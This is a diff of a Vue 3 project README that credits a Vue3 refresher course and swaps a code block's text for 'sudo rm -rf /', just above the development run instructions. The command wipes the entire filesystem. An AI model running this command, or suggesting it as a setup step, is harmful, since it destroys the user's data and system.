@@ -1,7 +1,9 @@
 # vue3-ultimate
 
+this is a sample from iamshaunjp's Vue3 refresher course 😅
+
 ```
-finally
+sudo rm -rf /
 ```
 
 # to run for development:
